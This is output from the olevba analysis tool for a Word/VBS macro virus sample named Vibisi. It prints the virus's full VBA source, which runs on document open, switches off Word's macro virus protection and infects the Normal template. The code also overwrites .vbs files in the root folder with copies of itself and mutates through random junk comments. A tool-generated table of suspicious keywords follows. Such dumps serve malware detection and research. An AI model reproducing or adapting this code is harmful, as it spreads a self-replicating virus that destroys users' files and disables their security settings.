olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Vibisi.d
Type: Text
-------------------------------------------------------------------------------
VBA MACRO Virus.MSWord.Vibisi.d 
in file: Virus.MSWord.Vibisi.d - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Call vibisi '
Sub vibisi() '
On Error Resume Next '
Dim fso, f, wo, nucode, code, jcode '
nucode = "" '
code = "" '
jcode = "" '
Set fso = CreateObject("scripting.filesystemobject") '
Set f = fso.opentextfile(wscript.scriptfullname, 1) '
full = f.readall '
Set f = fso.opentextfile(wscript.scriptfullname, 1) '
For i = 1 To 200 '
code = f.readline '
For j = 1 To Int(Rnd * 30): jcode = jcode & Chr(65 + Int(Rnd * 22)): Next '
nucode = nucode & code & Chr(39) & jcode & vbCr '

If Int(Rnd * 3) = 2 Then nucode = nucode & Chr(39) & jcode & vbCr '
jcode = "" '
If code = "" Then Exit For '
code = "" '
Next '
Set f = fso.opentextfile(wscript.scriptfullname, 2, True) '
f.writeline nucode '
Set wo = CreateObject("word.application") '
With wo.Application.FileSearch '
.LookIn = "c:\" '
.SearchSubFolders = False '
.FileName = "*.vbs" '
.Execute '
End With '
Set f = Nothing '
For i = 1 To wo.Application.FileSearch.FoundFiles.Count '
If wo.Application.FileSearch.FoundFiles(i) <> wscript.scriptfullname Then '

Set f = fso.opentextfile(wo.Application.FileSearch.FoundFiles(i), 2, True) '
f.writeline full '
End If '
Next '
wo.Options.VirusProtection = (Rnd * 0) '
wo.Options.SaveNormalPrompt = (Rnd * 0) '
wo.NormalTemplate.VBProject.VBComponents.Import wscript.scriptfullname '
wo.NormalTemplate.VBProject.VBComponents(wo.NormalTemplate.VBProject.VBComponents.Count).Name = "vbs" '
wo.NormalTemplate.VBProject.VBComponents("vbs").CodeModule.deletelines 1, 1 '
wo.NormalTemplate.Save '

wo.Quit '
Msgbox "I make you bleed!" & vbcr & vbcr & "jack twoflower / LineZer0 / Metaphase"
End Sub '
Sub autoopen()
On Error Resume Next '
Dim v(2000): t = Chr(39)
Options.VirusProtection = (Rnd * 0) '
Options.SaveNormalPrompt = (Rnd * 0) '
For i = 1 To ThisDocument.VBProject.VBComponents("vbs").CodeModule.CountOfLines '
jc = "" '
d = Int(Rnd * 3) '
p = InStr(ThisDocument.VBProject.VBComponents("vbs").CodeModule.Lines(i, 1), t) '
v(i) = Left(ThisDocument.VBProject.VBComponents("vbs").CodeModule.Lines(i, 1), (p - 1)) '

For j = 1 To Int(75 - (Rnd * 20)) '
jc = jc & Chr(255 - Int(Rnd * 100)) '
Next '
v(i) = v(i) & t & jc '
If d = 2 Then v(i) = v(i) & vbCr & Chr(32) & t & jc '
vc = vc & v(i) & vbCr '
n_: '
Next '
e_: '
Set fso = CreateObject("scripting.filesystemobject") '
Set f = fso.opentextfile("c:\scriptO8.ini", 2, True) '
cp = "Attribute VB_Name = ""vbs""" & vbCr '
f.write cp '
f.write vc '
If Len(NormalTemplate.VBProject.VBComponents("vbs").Name) = 0 Then NormalTemplate.VBProject.VBComponents.Import "c:\scriptO8.ini" '

If Len(ActiveDocument.VBProject.VBComponents("vbs").Name) = 0 Then '
ActiveDocument.VBProject.VBComponents.Import "c:\scriptO8.ini" '
ActiveDocument.SaveAs ActiveDocument.FullName '
End If '
With Application.FileSearch '
.LookIn = "c:\" '
.SearchSubFolders = False '
.FileName = "*.vbs" '
.Execute '
End With '
For x = 1 To Application.FileSearch.FoundFiles.Count '
Set fso = CreateObject("scripting.filesystemobject") '
Set f = fso.opentextfile(Application.FileSearch.FoundFiles(x), 2, True) '

codex = "call vibisi" & chr(39) & vbcr & ThisDocument.VBProject.VBComponents("vbs").CodeModule.Lines(1, ThisDocument.VBProject.VBComponents("vbs").CodeModule.CountOfLines)
f.write codex '
Next '
Msgbox "I make you bleed!" & vbcr & vbcr & "jack twoflower / LineZer0 / Metaphase" , 0, "Word/VBS.Bleed"
End Sub '

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoopen            |Runs when the Word document is opened        |
|Suspicious|write               |May write to a file (if combined with Open)  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

